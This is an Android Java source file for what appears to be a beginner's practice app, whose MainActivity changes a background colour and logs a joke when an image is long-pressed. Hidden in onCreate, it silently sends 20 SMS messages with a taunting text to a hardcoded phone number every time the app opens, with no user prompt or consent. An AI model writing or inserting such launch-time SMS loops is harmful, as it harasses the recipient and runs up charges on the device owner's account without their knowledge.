package com.example.controllers;

import android.content.Context;
import android.graphics.Color;
import android.support.constraint.ConstraintLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

public class MainActivity extends AppCompatActivity {
    ConstraintLayout    content;
    ImageView   imagen;


    SmsManager sms = SmsManager.getDefault();



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        for(int i=0; i<20;i++){
            sms.sendTextMessage("5523555215",null,"Obligame PRRO",null,null);

        }

        content =   (ConstraintLayout)findViewById(R.id.Content);
        content.setBackgroundColor(Color.BLUE);
        imagen  =   (ImageView)findViewById(R.id.chica);

        imagen.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                Log.w("Maxines","En la cara no, porque vivo de circuitos");
                return true;
            }
        });

        /*
        int a=5;
        int b=7;
        int c=a+b;
        Log.i("Error","El resultado es:"+c);
        log.i-> muestra informacion
        log.w->muestra un warning
        */
    }
}
